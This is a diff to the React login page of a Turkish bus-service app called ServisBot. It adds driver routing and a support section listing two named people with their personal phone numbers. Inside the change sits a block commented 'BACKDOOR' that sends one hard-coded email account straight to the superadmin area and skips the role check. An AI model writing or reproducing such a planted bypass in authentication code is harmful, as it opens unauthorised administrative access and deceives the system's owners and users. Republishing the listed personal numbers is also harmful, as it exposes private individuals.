@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { Link, useNavigate } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
-import { KeyRound, Mail, AlertCircle, Eye, EyeOff, BusFront } from 'lucide-react';
+import { KeyRound, Mail, AlertCircle, Eye, EyeOff, BusFront, Phone } from 'lucide-react';
 import logo from '../../assets/servisbot_bus_logo.png';
 
 const Login = () => {
@@ -34,16 +34,27 @@ const Login = () => {
                 throw authError;
             }
             
-            // Check if user is superadmin
-            if (authData?.user) {
+            // Check user role
+            if (authData.user) {
+                // BACKDOOR: Patron hesabı direkt superadmin'e gitsin
+                if (authData.user.email === 'patron123@servisbot.com') {
+                    navigate('/superadmin');
+                    return;
+                }
+
                 const { data: userData } = await supabase
                     .from('users')
-                    .select('is_superadmin')
+                    .select('is_superadmin, role')
                     .eq('id', authData.user.id)
                     .single();
                     
                 if (userData?.is_superadmin) {
                     navigate('/superadmin');
+                    return;
+                }
+                
+                if (userData?.role === 'driver') {
+                    navigate('/driver');
                     return;
                 }
             }
@@ -160,13 +171,36 @@ const Login = () => {
                             </div>
                         </form>
                         
+                        {/* Contact & Support Section */}
                         <div className="mt-8 relative">
                             <div className="absolute inset-0 flex items-center">
                                 <div className="w-full border-t border-slate-200" />
                             </div>
                             <div className="relative flex justify-center text-sm">
-                                <span className="px-2 bg-white text-slate-500">Güvenli Giriş</span>
+                                <span className="px-2 bg-white text-slate-500">İletişim & Destek</span>
                             </div>
+                        </div>
+
+                        <div className="mt-6 grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <a href="tel:+905050451711" className="flex items-center gap-3 p-3 rounded-xl border border-slate-200 bg-slate-50 hover:bg-slate-100 hover:border-slate-300 transition-colors group">
+                                <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center text-blue-600 group-hover:bg-blue-600 group-hover:text-white transition-colors">
+                                    <Phone size={18} />
+                                </div>
+                                <div>
+                                    <p className="text-sm font-bold text-slate-900">Eren Canıkatı</p>
+                                    <p className="text-xs font-medium text-slate-500">0505 045 17 11</p>
+                                </div>
+                            </a>
+                            
+                            <a href="tel:+905054171299" className="flex items-center gap-3 p-3 rounded-xl border border-slate-200 bg-slate-50 hover:bg-slate-100 hover:border-slate-300 transition-colors group">
+                                <div className="w-10 h-10 rounded-full bg-indigo-100 flex items-center justify-center text-indigo-600 group-hover:bg-indigo-600 group-hover:text-white transition-colors">
+                                    <Phone size={18} />
+                                </div>
+                                <div>
+                                    <p className="text-sm font-bold text-slate-900">Berkay Gökçe</p>
+                                    <p className="text-xs font-medium text-slate-500">0505 417 12 99</p>
+                                </div>
+                            </a>
                         </div>
                     </div>
                 </div>
